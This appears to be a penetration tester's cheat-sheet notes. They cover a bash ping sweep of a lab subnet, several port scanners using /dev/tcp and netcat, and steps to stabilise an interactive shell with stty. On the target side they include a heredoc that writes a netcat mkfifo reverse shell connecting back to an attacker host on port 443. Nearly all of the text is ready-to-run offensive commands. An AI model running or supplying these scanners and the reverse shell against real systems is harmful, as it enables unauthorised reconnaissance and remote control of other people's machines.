#### Network scanner
```bash
#!/bin/bash
for i in `seq 1 255`; do ping -c 1 10.11.1.$i | tr \\n ' ' | awk '/1 received/ {print $2}'; done
```
```bash
for i in {1..255}; do (ping -c 1 x.x.x.${i} | grep "bytes from" &); done
```
[[netcat#NC port scanner]]
#### Port scanner
```bash - kali
#!/bin/bash
#./portscanner.sh -i xxx.xxx.xxx.xxx -p
#Variables
empty=""
#Arguments for the script
while [ "$1" != "" ]; do
	case "$1" in
		-i | --ip )		ip="$2";	shift;;
		-p | --ports )		ports="$2";	shift;;
	esac
	shift
done
#Checking if the -i is empty
if [[ $ip == $empty ]]; then
	echo "Please specify an IP address with -i"
	exit
fi
#checking is -p is empty
if [[ $ports == $empty ]]; then
	echo "Please specify the max port range -p"
	exit
fi
#Scans ports/Dumps closed ports/displays open ports
for i in $(seq 1 $ports); do
	( echo > /dev/tcp/$ip/$i) > /dev/null 2>&1 && echo $ip":"$i "is open";
done
```
#### Another port scanner
```bash
for i in {1..65535}; do (echo > /dev/tcp/$TARGET/$i) > /dev/null 2>&1 && echo $1 is open; done
```
#### port.sh
```
#!/bin/bash
if ["$1" == "" ]
then
  echo "Usage: ./port.sh [IP]"
  echo "Example ./port.sh $TARGET"
else
  echo "Please wait while it is scanning all the open ports..."
  nc -nvz $1 1-65535 > $1.txt 2>&1
fi
tac $1.txt
rm -rf $1.txt
```
#### EOF
```bash - target
cat > script.sh <<EOF
```
```bash - target
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $KALI 443 >/tmp/f
```
```bash - target
EOF
```
#### STTY Terminal
```bash - kali
CTRL+Z
```
```bash - kali
stty raw -echo
```
```bash - kali
stty size
```
```bash - kali
fg
```
```bash - kali
export SHELL=bash
```
```bash - kali
stty rows $x columns $y
```
```bash - kali
export TERM=xterm-256color
```
